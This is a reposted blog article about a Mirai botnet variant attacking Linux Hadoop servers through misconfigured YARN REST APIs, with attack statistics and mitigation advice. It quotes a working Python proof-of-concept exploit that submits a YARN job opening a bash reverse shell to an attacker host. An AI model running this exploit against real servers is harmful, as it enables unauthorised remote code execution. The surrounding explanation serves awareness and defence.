<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>In addition to IoT: Mirai botnet started attacking machines on Linux</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Mirai botnet appeared in 2016 and in a short time managed to infect more than 600 thousand IoT devices. Last week it became known about the new versio...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>In addition to IoT: Mirai botnet started attacking machines on Linux</h1><div class="post__text post__text-html js-mediator-article">  Mirai botnet appeared in 2016 and in a short time managed to <a href="https://www.wired.com/story/mirai-botnet-minecraft-scam-brought-down-the-internet/">infect</a> more than 600 thousand IoT devices.  Last week <a href="https://www.theregister.co.uk/2018/11/22/mirai_for_linux_on_x86/">it became known</a> about the new version of Mirai, the purpose of which is Linux servers with Hadoop.  We understand what vulnerability the virus uses and how to ‚Äúcover it up‚Äù. <br><br> <a href="https://habr.com/company/vasexperts/blog/431686/"><img src="https://habrastorage.org/webt/ku/bo/gq/kubogq0h-qt7rkyhwzy3s7fbryk.jpeg"></a> <a name="habracut"></a><br>  <font color="#A9A9A9"><i>/ Flickr / <a href="">DJ Shin</a> / <a href="https://creativecommons.org/licenses/by-sa/3.0/">CC BY-SA</a></i></font> <br><br><h2>  A couple of words about Mirai </h2><br>  Mirai has become known for a series of high-profile attacks.  One was on the blog of journalist Brian Krebs (Brian Krebs) after the publication of an article on the sale of botnet services.  The other is on a <a href="https://en.wikipedia.org/wiki/2016_Dyn_cyberattack">large DNS provider Dyn</a> , which caused a failure in the work of global services: Twitter, Reddit, PayPal, GitHub, and many others. 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      To ‚Äúcapture‚Äù IoT devices, a botnet used a vulnerability associated with weak passwords (manufacturers made them the same for all smart devices).  The malware monitored the Internet for open telnet ports and brute-in the known login-password pairs for accessing the device owner‚Äôs account.  If successful, the gadget became part of the "malicious network." <br><br>  At the end of 2016, the developers posted the <a href="https://xakep.ru/2016/10/03/mirai-source-code/">source codes of the</a> virus on the network.  This led to the emergence of several more versions of malicious software, but they all made the goal of the Internet of Things their goal.  Until recently, the Mirai worm now appeared, which attacks Linux servers in data centers. <br><br><h2>  Botnet "recruits" Linux </h2><br>  <a href="https://asert.arbornetworks.com/mirai-not-just-for-iot-anymore/">The report</a> on the new version of Mirai was published by information security specialists from NETSCOUT.  It is known that a botnet attacks servers with the Apache Hadoop framework installed.  As the information security specialists say, hackers are attracted by the power of iron.  Hadoop is used on servers running high-performance computing and working with machine learning algorithms.  The network of productive devices will allow you to make more destructive DDoS attacks. <br><br>  The Mirai version for Linux still hacks the system by selecting factory telnet credentials.  But now the program does not need to distinguish between different types of IoT gadget architectures; Mirai attacks only servers with x86 processors. <br><blockquote>  At the same time, the new botnet does not install malware on the hacked device on its own.  The worm sends the attacker's IP-address of the vulnerable machine and a pair of login-password for it.  Then hackers install DDoS bots manually. </blockquote><h2>  What vulnerability is used </h2><br>  The malware uses the YARN module for server penetration, which is responsible for managing cluster resources and scheduling tasks in Apache Hadoop. <br><br>  If the YARN configuration is incorrect, the attacker <a href="https://medium.com/%40neerajsabharwal/hadoop-yarn-hack-9a72cc1328b6">can gain</a> access to the system‚Äôs internal REST API through ports 8088 and 8090. When connecting remotely, an attacker can add a new application to the cluster.  By the way, this <a href="http://archive.hack.lu/2016/Wavestone%2520-%2520Hack.lu%25202016%2520-%2520Hadoop%2520safari%2520-%2520Hunting%2520for%2520vulnerabilities%2520-%2520v1.0.pdf">problem has been known</a> for several years already - PoC-exploits have been published on <a href="https://www.exploit-db.com/exploits/45025/">ExploitDB</a> and <a href="https://github.com/vulhub/vulhub/tree/master/hadoop/unauthorized-yarn">GitHub</a> . <br><br>  For example, the <a href="https://github.com/vulhub/vulhub/blob/master/hadoop/unauthorized-yarn/exploit.py">following</a> exploit <a href="https://github.com/vulhub/vulhub/blob/master/hadoop/unauthorized-yarn/exploit.py">code is presented</a> on GitHub: <br><br><pre><code class="python hljs"><span class="hljs-comment"><span class="hljs-comment">#!/usr/bin/env python import requests target = 'http://127.0.0.1:8088/' lhost = '192.168.0.1' # put your local host ip here, and listen at port 9999 url = target + 'ws/v1/cluster/apps/new-application' resp = requests.post(url) app_id = resp.json()['application-id'] url = target + 'ws/v1/cluster/apps' data = { 'application-id': app_id, 'application-name': 'get-shell', 'am-container-spec': { 'commands': { 'command': '/bin/bash -i &gt;&amp; /dev/tcp/%s/9999 0&gt;&amp;1' % lhost, }, }, 'application-type': 'YARN', } requests.post(url, json=data)</span></span></code> </pre> <br>  In addition to Mirai, this vulnerability is used by another DDoS bot, DemonBot, which was discovered in October by Radware specialists.  Since the beginning of autumn, they have recorded more than a million hacking attempts through the YARN vulnerability daily. <br><br><h2>  What do experts say </h2><br>  According to the information security specialists, the most hacking attempts were made in the USA, Great Britain, Italy, and Germany.  At the beginning of the month, just over a thousand servers worldwide were exposed to vulnerabilities in YARN.  This is not so much, but they all have high computing power. <br><br>  There is also information that a vulnerability in Hadoop could provide attackers with access to data stored on unprotected servers.  So far, no such cases have been registered, but experts <a href="https://www.extrahop.com/company/blog/2018/detect-demonbot-exploiting-hadoop-yarn-remote-code-execution/">warn</a> that this is only a matter of time. <br><br>  The new version of Mirai does not spread quickly - only a few tens of thousands of attempts to hack Hadoop machines through YARN occur every day.  And all the attacks come from a small number of IP addresses - no more than forty. <br><br><img src="https://habrastorage.org/webt/m1/we/oq/m1weoqji7fkig1pytwqflf5zt9c.jpeg"><br>  <font color="#A9A9A9"><i>/ Flickr / <a href="https://www.flickr.com/photos/jelene/2594095295">jelene morris</a> / <a href="https://www.flickr.com/photos/jelene/2594095295">cc by</a></i></font> <br><br>  This behavior of intruders and NETSCOUT experts suggested that the virus does not spread automatically - hackers manually scan the Internet and deploy the program to unprotected machines.  This means that owners of servers with Hadoop installed have more time to close the vulnerability. <br><br>  To protect against attacks, <a href="https://medium.com/%40neerajsabharwal/hadoop-yarn-hack-9a72cc1328b6">you need to change the</a> network security <a href="https://medium.com/%40neerajsabharwal/hadoop-yarn-hack-9a72cc1328b6">settings</a> .  It is enough for administrators to restrict access to the computing cluster ‚Äî configure IP filters or completely close the network from external users and applications. <br><br>  To prevent unauthorized access to the system, security specialists also advise upgrading Hadoop to version 2.x and enabling authentication via the Kerberos protocol. <br><br><hr><br>  <i>Several posts from the VAS Experts blog:</i> <i><br><br></i> <ul><li>  <i><a href="https://vasexperts.ru/blog/bezopasnost/botnet-spamit-cherez-routery/">Botnet "spamming" through routers - what you need to know</a></i> </li><li>  <i><a href="https://vasexperts.ru/blog/seti/vnedrenie-ipv6-faq-dlya-internet-provajderov/">Implementing IPv6 - FAQ for Internet Providers</a></i> </li><li>  <i><a href="https://vasexperts.ru/blog/bezopasnost/ddos-i-5g-tolshhe-truba-bolshe-problem/">DDOS and 5G: thicker "pipe" - more problems</a></i> </li></ul> <i><br></i>  <i>A couple of fresh materials from our blog on Habr√©:</i> <i><br><br></i> <ul><li>  <i><a href="https://habr.com/company/vasexperts/blog/430136/">How Starlink will launch - satellite Internet from Ilona Mask</a></i> </li><li>  <i><a href="https://habr.com/company/vasexperts/blog/429380/">Replacing TCP: QUIC is ready for deployment [but not ready to become RFC]</a></i> </li></ul></div><p>Source: <a href="https://habr.com/ru/post/431686/">https://habr.com/ru/post/431686/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../431668/index.html">What's new in GoLand 2018.3</a></li>
<li><a href="../431670/index.html">Zen and the art of clean code support</a></li>
<li><a href="../431676/index.html">Tactful robot: can listen and does not interrupt</a></li>
<li><a href="../431678/index.html">There is a mobile developer in the forest, he sees - Kotlin is on fire. He sat down in Kotlin and burned</a></li>
<li><a href="../431682/index.html">Marriott leaked personal data to 500 million customers</a></li>
<li><a href="../431688/index.html">How Clang Compiles a Function</a></li>
<li><a href="../431690/index.html">We solve crackme from Kaspersky Lab</a></li>
<li><a href="../431692/index.html">The success of immunotherapy in the treatment of multiple sclerosis</a></li>
<li><a href="../431694/index.html">Sort "Tower of Hanoi"</a></li>
<li><a href="../431696/index.html">Kodein. The basics</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>